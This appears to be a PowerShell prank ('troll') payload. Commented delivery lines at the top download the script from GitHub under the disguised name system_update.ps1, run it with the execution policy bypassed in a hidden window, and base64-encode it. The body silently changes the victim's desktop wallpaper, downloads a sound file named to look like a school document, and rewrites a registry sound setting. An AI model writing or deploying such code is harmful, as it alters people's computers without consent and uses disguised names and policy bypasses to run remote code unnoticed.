# powershell -c "start-bitstransfer -source https://github.com/polymorphicopcode/pony/pony.ps1 -destination .\system_update.ps1
# powershell -c "powershell -ExecutionPolicy Bypass -File .\pony.ps1" # -windowStyle hidden
# [convert]::ToBase64String((Get-Content -path .\pony.ps1 -Encoding byte))

$imageUrl = "https://wallpapers.com/images/featured/my-little-pony-x5ov0p26o9yzytsn.jpg";$downloadPath = "$env:USERPROFILE\Downloads\mylittlepony.jpg"
Start-BitsTransfer -Source $imageUrl -Destination $downloadPath
# Load necessary functions
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
$SPI_SETDESKWALLPAPER = 0x0014;$SPIF_UPDATEINIFILE = 0x01;$SPIF_SENDCHANGE = 0x02
[Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $downloadPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
$wavUrl = "https://github.com/PolymorphicOpcode/troll/raw/main/my_little_pony.wav";$downloadPath = "$env:USERPROFILE\Downloads\important_school_document.docx.wav"
Start-BitsTransfer -Source $wavUrl -Destination $downloadPath
# Modify the registry value for "Open Program" sound
$openProgramRegPath = "HKCU:\AppEvents\Schemes\Apps\.Default\Open\.Current"
Set-ItemProperty -Path $openProgramRegPath -Name "(Default)" -Value $downloadPath
$null = [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")